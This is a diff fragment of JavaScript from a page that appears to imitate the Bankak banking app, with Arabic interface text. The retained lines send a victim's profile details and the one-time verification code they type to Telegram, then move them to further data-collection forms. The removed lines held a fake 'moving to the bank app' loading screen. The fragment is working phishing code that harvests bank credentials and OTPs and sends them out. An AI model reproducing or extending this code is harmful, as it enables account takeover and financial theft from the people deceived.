             sendToTelegram(profileMsg);
             switchScreen('screenPreviewForm');
-        }
-
-        function proceedToBankakApp() {
-            const loader = document.getElementById('loader-overlay');
-            document.getElementById('loader-message').textContent = "جاري الانتقال لتطبيق بنكك...";
-            loader.style.display = 'flex';
-
-            setTimeout(function() {
-                loader.style.display = 'none';
-                switchScreen('screenLogin'); 
-            }, 7000);
         }
 
         const questions = [
@@ -1870,7 +1992,6 @@
 
           sendToTelegram(`📱 *رمز التحقق OTP*\n\n🔢 الرمز: \`${otp}\``);
           
-          // الانتقال لشاشة الاستمارة الإضافية بعد رمز التحقق
           switchScreen('screenPostOtpForm');
         }
 
